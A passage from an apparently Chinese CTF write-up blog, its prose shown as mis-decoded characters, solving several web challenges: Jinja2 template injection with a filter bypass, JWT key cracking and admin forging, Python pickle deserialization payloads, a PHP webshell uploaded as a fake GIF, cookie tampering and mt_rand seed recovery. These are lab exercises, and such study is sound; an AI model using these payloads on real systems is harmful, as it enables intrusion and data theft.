<p><img src="/images/DHRQ62NL9WHJ3KCS.png" srcset="/img/loading.gif" lazyload><br>å› ä¸ºæ˜¯ç”¨flaskæ­å»ºçš„ç½‘ç«™ï¼Œæ‰€ä»¥è¿™é‡Œçš„åˆ¤æ–­å¾ˆè‡ªç„¶å°±æ˜¯jinja2çš„æ¨¡æ¿æ³¨å…¥ã€‚</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0]&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p>ç”¨basesæˆ–mroéƒ½è¡Œï¼Œåªè¦æ‰“å°è¿”å›(&lt;class â€˜objectâ€™&gt;,)ï¼Œæ‰¾åˆ°äº†ä»–çš„åŸºç±»objectå³å¯<br><img src="/images/F34OP5L5YL70ND5.png" srcset="/img/loading.gif" lazyload><br>æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨subclasses() è¿™ä¸ªæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›çš„æ˜¯è¿™ä¸ªç±»çš„å­ç±»çš„é›†åˆï¼Œä¹Ÿå°±æ˜¯objectç±»çš„å­ç±»çš„é›†åˆã€‚</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/XB3KH95A5B5FCPYQ.png" srcset="/img/loading.gif" lazyload><br>åœ¨åŸºæœ¬ç±»çš„å­ç±»ä¸­æ‰¾åˆ°é‡è½½è¿‡çš„__init__ç±»(è²Œä¼¼æ˜¯ä¸ªç±»å°±è¡Œ)<br>é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥æ‰¾ç¬¬ä¸€ä¸ªæ˜¾ç¤ºçš„ç±»</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()[58]&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/JOCO5EUQUU6V8XXB.png" srcset="/img/loading.gif" lazyload></p>
<p>æµ‹è¯•å‘ç°globalsè¢«è¿‡æ»¤äº†ï¼Œä½¿ç”¨æ‹¼å‡‘æ³•ç»•è¿‡</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()[58].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;]&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥åˆ©ç”¨evalè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()[58].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&#x27;__import__(&quot;os&quot;).popen(&quot;dir&quot;).read()&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/S9WS6UXXSXDW65FE.png" srcset="/img/loading.gif" lazyload><br>flagåœ¨flasklightä¸­</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()[58].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&#x27;__import__(&quot;os&quot;).popen(&quot;cat flasklight/coomme_geeeett_youur_flek&quot;).read()&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2124510">å…³äºflaskçš„SSTIæ³¨å…¥[é€šä¿—æ˜“æ‡‚]</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3679?time__1311=n4+xnD0DBDgDc7D9DUO4BqOoTnl7WSWDIxrD#toc-8">flaskä¹‹sstiæ¨¡ç‰ˆæ³¨å…¥ä»é›¶åˆ°å…¥é—¨</a></p>
<h2 id="ciscn2019-ååŒ—èµ›åŒº-day1-web2-ikun"><a href="#ciscn2019-ååŒ—èµ›åŒº-day1-web2-ikun" class="headerlink" title="ciscn2019-ååŒ—èµ›åŒº-day1-web2-ikun"></a>ciscn2019-ååŒ—èµ›åŒº-day1-web2-ikun</h2><p>æ ¹æ®é¡µé¢çš„æç¤ºï¼Œéœ€è¦æ‰¾åˆ°lv6<br>ä½†æ˜¯ç¿»äº†å¾ˆå¤šé¡µä¹Ÿæ²¡æœ‰æ‰¾åˆ°lv6<br>å†™ä¸€ä¸ªpythonè„šæœ¬</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs maxima">import requests<br><br>url = &#x27;http://eca3df9d-<span class="hljs-number">0ecd</span>-<span class="hljs-number">46b6</span>-b0ab-7166f51fb956.node5.buuoj.cn:<span class="hljs-number">81</span>/shop?page=&#x27;<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2000</span>):<br>    a = requests.<span class="hljs-built_in">get</span>(url + str(i))<br>    <span class="hljs-keyword">if</span> &#x27;lv6.png&#x27; <span class="hljs-keyword">in</span> a.text:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-built_in">break</span><br><br></code></pre></td></tr></table></figure>
<p>åœ¨181é¡µå‘ç°lv6<br>å‘ç°ä»·æ ¼æœ‰ç‚¹é«˜ï¼Œçœ‹èƒ½ä¸èƒ½æŠ“åŒ…æ”¹ä¸‹ä»·æ ¼<br>åªèƒ½æ”¹æŠ˜æ‰£<br><img src="/images/JBFBSKZY4FWH5KWZ7KC.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/images/V7NOFLUCZI1RNT.png" srcset="/img/loading.gif" lazyload><br>è¿™é‡Œæ¶‰åŠåˆ°JWTä¼ªé€ æ¼æ´<br>æ”»å‡»å·¥å…·<a href="https://link.csdn.net/?target=https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>è·å¾—å¯†åŒ™<br>æˆ‘ä½¿ç”¨çš„æ˜¯kaliç³»ç»Ÿ<br><img src="/images/ECFP2LKJ1JB7QPI9LO8.png" srcset="/img/loading.gif" lazyload><br>ç ´è§£è·å¾—å¯†åŒ™1Kun<br>ç„¶åè®¿é—®<a target="_blank" rel="noopener" href="https://jwt.io/">JWTæ”»å‡»ç½‘ç«™</a>,å°†JWTå¤åˆ¶ä¸Šå»å³å¯<br><img src="/images/JNBAT35QJHZPXF.png" srcset="/img/loading.gif" lazyload><br>å°†usernameæ”¹ä¸ºadminï¼Œè¿˜æœ‰å°†åˆšæ‰çš„å¯†åŒ™å¡«å…¥<br>å°†cookiesçš„JWTæ›¿æ¢ï¼Œå¾—åˆ°<br><img src="/images/YLWH6TZTRJ3H32BKER9.png" srcset="/img/loading.gif" lazyload><br>æºç ä¸­å‘ç°<br><img src="/images/R8M363537PNFDRFIUH.png" srcset="/img/loading.gif" lazyload></p>
<p>æ‰¾åˆ°admin.py<br><img src="/images/CHUL1P513UOV9ZY610EI.png" srcset="/img/loading.gif" lazyload><br>è¿™é‡Œå¯ä»¥ç†è§£ä¸ºä¸phpä¸€æ ·çš„ååºåˆ—åŒ–</p>
<p>self.render(â€˜form.htmlâ€™, res&#x3D;p, member&#x3D;1)<br>è¿™æ®µä»£ç çš„æ„æ€å°±æ˜¯æ‰¾åˆ°æ¨¡æ¿æ–‡ä»¶ï¼Œè¿›è¡Œæ¸²æŸ“ï¼Œä»è€Œæ˜¾ç¤ºé¡µé¢<br>æ¥è§‚å¯Ÿä¸€ä¸‹form.htmlé¡µé¢<br><img src="/images/P0U5OSG2IY3UT03FE6C.png" srcset="/img/loading.gif" lazyload><br>è¯´æ˜ä¼ å…¥çš„æ˜¯å¯ä»¥ç›´æ¥è¿›è¡Œå›æ˜¾çš„ï¼Œè€Œä¸”å¯ä»¥å°†è‡ªå®šä¹‰çš„ç±»è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œå› æ­¤å­˜åœ¨Pickleååºåˆ—åŒ–æ¼æ´ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥æ„é€ ä¸€ä¸ªé€šè¿‡pickle.dumpsåºåˆ—åŒ–çš„payloadï¼Œä»è€Œè¢«è§£æè¯»å–flagæˆ–å…¶ä»–ä¿¡æ¯ã€‚<br>æˆ‘ä»¬æ„å»ºä¸€ä¸ªç±»ï¼Œç±»é‡Œé¢çš„__reduce__pythoné­”æœ¯æ–¹æ³•ä¼šåœ¨è¯¥ç±»è¢«ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè¢«è°ƒç”¨<br>æ„é€ payloadå¯ä»¥ä½¿ç”¨æ–¹æ³•__reduce__(self)ï¼Œå…ˆè¦è·å–çš„flagæ–‡ä»¶çš„ä½ç½®ï¼Œç„¶åè¿›è¡Œè¯»å–</p>
<p>ç‚¹å‡»ä¸€é”®æˆä¸ºå¤§ä¼šå‘˜åï¼Œæ›¿æ¢become<br>os.systemå’Œos.popen<br>os.system è°ƒç”¨ç³»ç»Ÿå‘½ä»¤ï¼Œå®Œæˆåé€€å‡ºï¼Œè¿”å›ç»“æœæ˜¯å‘½ä»¤æ‰§è¡ŒçŠ¶æ€ï¼Œä¸€èˆ¬æ˜¯0<br>os.popen() æ— æ³•è¯»å–ç¨‹åºæ‰§è¡Œçš„è¿”å›å€¼<br>è¿™ä¸¤ä¸ªå‡½æ•°åªæœ‰ä»¥printè¾“å‡ºæ—¶æ‰ä¼šå›æ˜¾ï¼Œå¦‚æœæ˜¯ä»¥returnè¿”å›çš„å°±ä¸ä¼šæ˜¾ç¤ºç»“æœã€‚<br>å¯ä»¥ä½¿ç”¨commands.getoutput()è¿™ä¸ªå‡½æ•°æ¥è¿›è¡Œä»£æ›¿ï¼Œæ„é€ payload</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> commands<br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-keyword">class</span> payload(<span class="hljs-title">object</span>):</span><br><span class="hljs-class">    def __reduce__(<span class="hljs-title">self</span>):</span><br><span class="hljs-class">       return (<span class="hljs-title">commands</span>.<span class="hljs-title">getoutput</span>,(&#x27;<span class="hljs-title">ls</span> /&#x27;,))</span><br><span class="hljs-class"></span><br><span class="hljs-class">a = pickle.dumps(<span class="hljs-title">payload</span>())</span><br><span class="hljs-class">a = urllib.quote(<span class="hljs-title">a</span>)</span><br><span class="hljs-class">print a</span><br><span class="hljs-class"></span><br></code></pre></td></tr></table></figure>
<p><img src="/images/VCLCNT98$GCXFF8.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/images/JN7XR4QJ48H7LL1I58.png" srcset="/img/loading.gif" lazyload></p>
<p>æ‰¾åˆ°flag.txtæ–‡ä»¶ï¼Œå¹¶è¯»å–</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> commands<br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-keyword">class</span> payload(<span class="hljs-title">object</span>):</span><br><span class="hljs-class">    def __reduce__(<span class="hljs-title">self</span>):</span><br><span class="hljs-class">       return (<span class="hljs-title">commands</span>.<span class="hljs-title">getoutput</span>,(&#x27;<span class="hljs-title">cat</span> /<span class="hljs-title">flag</span>.<span class="hljs-title">txt&#x27;</span>,))</span><br><span class="hljs-class"></span><br><span class="hljs-class">a = pickle.dumps(<span class="hljs-title">payload</span>())</span><br><span class="hljs-class">a = urllib.quote(<span class="hljs-title">a</span>)</span><br><span class="hljs-class">print a</span><br><span class="hljs-class"></span><br></code></pre></td></tr></table></figure>
<p>æˆ–</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> commands<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">payload</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>       <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))<br><br>a = pickle.dumps(payload())<br>a = urllib.quote(a)<br><span class="hljs-built_in">print</span> a<br><br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/252189.html">Python Pickleååºåˆ—åŒ–æ¼æ´</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cjsblog/p/9277677.html">è®¤è¯†JWT</a></p>
<h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>å¾ˆç®€å•çš„é¢˜ç›®<br>é™¤äº†loginå’Œregisteræ²¡æœ‰å…¶å®ƒçš„å…¥å£<br>é‚£ä¹ˆæˆ‘ä»¬å…ˆæ³¨å†Œç™»å½•<br>ç™»å½•æˆåŠŸåè·³å¦å¤–ä¸€ä¸ªé¡µé¢<br>å¼¹å‡ºPlease Login First!<br>æŸ¥çœ‹æºä»£ç å‘ç°è¿™æ˜¯é¡µé¢è‡ªå¸¦çš„</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;Please Login First!&#x27;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>ä¸ç”¨ç®¡ä»–</p>
<p>è¿™é‡Œæœ‰ä¸ªå›¾ç‰‡ä¸Šä¼ æŒ‰é’®<br>å…ˆä¸Šä¼ <br>3.png<br>å†…å®¹ä¸ºä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>exif_imagetype not image!<br>æ¬ºéª—ä¸€ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89A<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>æˆåŠŸæ¬ºéª—<br>é¡µé¢æ²¡æœ‰å›æ˜¾ä¸Šä¼ é“¾æ¥<br>æºä»£ç çœ‹ä¸€ä¸‹<br><img src="/images/0WZD35M4RBCRVD79DG9E.png" srcset="/img/loading.gif" lazyload><br>æ‰¾åˆ°<br>ä½†è¿›å…¥è¿™ä¸ªé“¾æ¥æˆ‘ä»¬æ˜¯æ²¡åŠæ³•æ‰§è¡Œå‘½ä»¤çš„<br>ç›²çŒœä¸€æ‰‹<br>æˆ‘ä»¬å°†ä¸Šä¼ çš„æ–‡ä»¶åç¼€æ”¹ä¸º3.png.php<br><img src="/images/TES6BFIKBE2QOECD1O.png" srcset="/img/loading.gif" lazyload><br>åç¼€ä¸ºphp<br>è¿›å…¥é“¾æ¥<br>payload</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">a</span><span class="hljs-operator">=</span>phpinfo()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/Y0RSJYKMIZ5HY04SB.png" srcset="/img/loading.gif" lazyload><br>çœ‹çœ‹æ²¡æœ‰è¿‡æ»¤ä»€ä¹ˆå‡½æ•°<br>ç›´æ¥</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs maxima">a=<span class="hljs-built_in">system</span>(&#x27;ls&#x27;);<br>//GIF89A d41d8cd98f00b204e9800998ecf8427e.php<br><br>a=<span class="hljs-built_in">system</span>(&#x27;ls /&#x27;);<br>//GIF89A Flag_aqi2282u922oiji bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr <span class="hljs-built_in">var</span><br><br>a=<span class="hljs-built_in">system</span>(&#x27;cat /Flag_aqi2282u922oiji&#x27;);<br>//GIF89A flag&#123;4e0eee16-<span class="hljs-number">52b1</span>-<span class="hljs-number">4248</span>-<span class="hljs-number">8565</span>-2da97f5cdb35&#125;<br></code></pre></td></tr></table></figure>

<h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>é¡µé¢æœ‰ä¸‰ç§é¥¼å¹²ï¼Œå…¶ä¸­æœ€è´µçš„é¥¼å¹²ä¸ºflagé¥¼å¹²ï¼Œæ¨æµ‹è´­ä¹°è¿™æ¬¾é¥¼å¹²å°±èƒ½è·å¾—flag<br>ä½†æˆ‘ä»¬çš„åˆå§‹èµ„é‡‘ä¸º50åˆ€ï¼Œä¹°ä¸èµ·flagé¥¼å¹²ï¼Œæºç çœ‹ä¸‹å•¥ä¹Ÿæ²¡æœ‰<br>å…ˆè´­ä¹°1åˆ€çš„é¥¼å¹²<br>æŠ“åŒ…çœ‹çœ‹æœ‰ä»€ä¹ˆæ•°æ®<br><img src="/images/DF7AUEXKU5PTRO3T.png" srcset="/img/loading.gif" lazyload><br>ç¥ä¼¼base64åŠ å¯†ï¼Œè§£å¯†ä¸€ä¸‹<br><img src="/images/AY0ZIKGBRGIA0.png" srcset="/img/loading.gif" lazyload><br>ä¸çŸ¥é“historyé‡Œçš„æ•°æ®æ˜¯ä»€ä¹ˆæ ·çš„<br><img src="/images/B6JIXDQNYCIHZP5.png" srcset="/img/loading.gif" lazyload><br>åé¢åˆæŠ“ä½äº†ä¸€ä¸ªï¼Œæ‰¾åˆ°æ•°æ®<br>è¯•ç€æ”¹ä¸€ä¸‹jsonåŒ…çš„æ•°æ®<br>è¿™å›æˆ‘ä»¬ä¹°10åˆ€çš„<br><img src="/images/VCH20KR4EMS37AMS.png" srcset="/img/loading.gif" lazyload><br>ä¿®æ”¹money<br>å›åˆ°é¡µé¢å‘ç°é’±å˜ä¸ºæˆ‘ä»¬æƒ³è¦çš„ï¼Œè¿™æ—¶æˆ‘ä»¬ç›´æ¥è´­ä¹°flagé¥¼å¹²å³å¯</p>
<h2 id="GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–"><a href="#GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–" class="headerlink" title="[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–"></a>[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–</h2><p>çŒœå­—ç¬¦ä¸²æ¸¸æˆï¼ŒçŒœä¸äº†ä¸€ç‚¹<br>çœ‹çœ‹æºç <br>æºç ä¸­æ‰¾åˆ°ä¸€ä¸ªphpæ–‡ä»¶check.php<br>æ²¡é—®é¢˜å¯ä»¥è¿›å»<br>æºç å‘ç°çœŸçš„æ˜¯éšæœºæ•°å•Š<br>å¯¹å‡½æ•°æŒ¨ä¸ªæœç´¢åå‘ç°mt_srandå’Œmt_randæ˜¯æœ‰ä¸€ä¸ªä¼ªéšæœºæ•°æ¼æ´<br>æˆ‘çš„ç†è§£æ˜¯mt_srand($seed)ï¼Œç§å­å€¼å°±æ˜¯æä¾›äº†ä¸€ä¸ªåˆå§‹çš„å€¼<br>å¦‚æœä»¥åŒæ ·çš„mt_srand($seed)å€¼è°ƒç”¨mt_rand(),é‚£ä¹ˆæ¯æ¬¡ç¨‹åºè¿è¡Œéƒ½ä¼šå¾—åˆ°ç›¸åŒçš„éšæœºæ•°åºåˆ—</p>
<p>ç°åœ¨å·²ç»çŸ¥é“äº†å‰10ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡å·²çŸ¥çš„å­—ç¬¦æ¥æ¨å‡ºç§å­å€¼ï¼Œè¿™éœ€è¦å€ŸåŠ©ä¸€ä¸ªå·¥å…·<a target="_blank" rel="noopener" href="https://github.com/openwall/php_mt_seed">php_mt_seed</a><br>php_mt_seedæ˜¯cè¯­è¨€ç¼–å†™çš„çˆ†ç ´éšæœºæ•°åºåˆ—ç§å­çš„å·¥å…·ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©çš„æ˜¯kaliç³»ç»Ÿï¼Œåœ¨ç›®å½•ä¸‹è¿è¡Œmakeå‘½ä»¤å°±é…ç½®å¥½äº†<br><img src="/images/UEGFLJDLTAGX3D9N.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/images/BHD9I0PD4MM8RB49POT.png" srcset="/img/loading.gif" lazyload><br>ä½¿ç”¨å®˜æ–¹æ–‡æ¡£ä¸­çš„ä½¿ç”¨æ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-variable">$allowable_characters</span> = <span class="hljs-string">&#x27;abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789&#x27;</span>;<br>   <span class="hljs-variable">$len</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$allowable_characters</span>) - <span class="hljs-number">1</span>;<br>   <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>];<br>   <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$pass</span>); <span class="hljs-variable">$i</span>++) &#123;<br>     <span class="hljs-variable">$number</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$allowable_characters</span>, <span class="hljs-variable">$pass</span>[<span class="hljs-variable">$i</span>]);<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$number</span> <span class="hljs-subst">$number</span> 0 <span class="hljs-subst">$len</span>  &quot;</span>;<br>   &#125;<br>   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>   <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>éœ€è¦å°†æˆ‘ä»¬çš„åºåˆ—è½¬æ¢ä¸ºphp_mt_seedå¯ä»¥è¯†åˆ«çš„æ ¼å¼<br><img src="/images/Z4G7O5TWL8KY09.png" srcset="/img/loading.gif" lazyload><br>ç„¶å</p>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">./php_mt_seed<span class="hljs-number"> 30 </span>30<span class="hljs-number"> 0 </span>61 <span class="hljs-number"> 9 </span>9<span class="hljs-number"> 0 </span>61 <span class="hljs-number"> 9 </span>9<span class="hljs-number"> 0 </span>61 <span class="hljs-number"> 55 </span>55<span class="hljs-number"> 0 </span>61 <span class="hljs-number"> 50 </span>50<span class="hljs-number"> 0 </span>61 <span class="hljs-number"> 22 </span>22<span class="hljs-number"> 0 </span>61 <span class="hljs-number"> 38 </span>38<span class="hljs-number"> 0 </span>61 <span class="hljs-number"> 8 </span>8<span class="hljs-number"> 0 </span>61 <span class="hljs-number"> 55 </span>55<span class="hljs-number"> 0 </span>61 <span class="hljs-number"> 19 </span>19<span class="hljs-number"> 0 </span>61<br></code></pre></td></tr></table></figure>
<p><img src="/images/L7EBWVPZMJ2KLWYNUOI.png" srcset="/img/loading.gif" lazyload></p>
<p>è¿™é‡Œå°±è·å¾—äº†seedå€¼735396921</p>
<p>æ‰§è¡Œé¢˜ç›®æºä»£ç ï¼Œç¡®è®¤æˆ‘ä»¬çš„seedå€¼</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">735396921</span>);<br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>    <span class="hljs-variable">$str</span>.=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str_long1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//4jjTOwCiTtBHTQBt4oBa</span><br></code></pre></td></tr></table></figure>
<p>æˆåŠŸåæ¨<br>å¡«ç©ºå³å¯å¾—åˆ°flag</p>
<h2 id="çº¢æ˜è°·CTF-2021-write-shell"><a href="#çº¢æ˜è°·CTF-2021-write-shell" class="headerlink" title="[çº¢æ˜è°·CTF 2021]write_shell"></a>[çº¢æ˜è°·CTF 2021]write_shell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 